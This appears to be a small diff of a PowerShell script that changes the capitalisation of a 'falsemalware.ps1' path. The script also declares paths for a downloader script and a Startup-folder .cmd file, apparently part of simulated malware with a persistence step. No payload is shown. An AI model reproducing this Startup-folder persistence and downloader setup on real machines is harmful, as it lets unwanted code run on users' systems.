@@ -5,7 +5,7 @@ Start-Sleep(1)
 
 $processName = "Powershell"
 $processName2 = "pwsh"
-$FileFalsemalware = "C:\temp\falsemalware.ps1"
+$FileFalsemalware = "C:\temp\Falsemalware.ps1"
 $FileDownloader = "C:\temp\Downloader.ps1"
 $FileStartup = "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Startup.cmd"
 
